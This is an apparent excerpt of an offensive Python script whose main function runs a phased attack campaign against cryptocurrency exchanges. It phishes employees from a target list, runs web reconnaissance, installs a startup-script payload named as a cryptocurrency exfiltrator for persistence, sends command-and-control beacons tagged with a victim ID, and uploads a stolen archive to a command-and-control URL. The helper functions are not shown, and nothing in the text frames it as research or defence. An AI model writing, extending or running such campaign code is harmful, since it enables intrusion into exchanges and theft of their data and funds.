...
def main():
    """
    Main function to run the cryptocurrency_exchange_campaign campaign.
    """
    print(f"[*] Starting cryptocurrency_exchange_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("cryptocurrency_exchanges_employees.txt")
    run_tool("apt_web_recon.js", "--target cryptocurrency_exchanges.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/cryptocurrency_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-CRYPTOCURRENCY_EXCHANGES-01")
    ...
    exfiltration.exfiltrate_data("cryptocurrency/cryptocurrency.zip", "https://c2.example.com/upload")
    run_tool("payloads/cryptocurrency_exfiltrator.py")
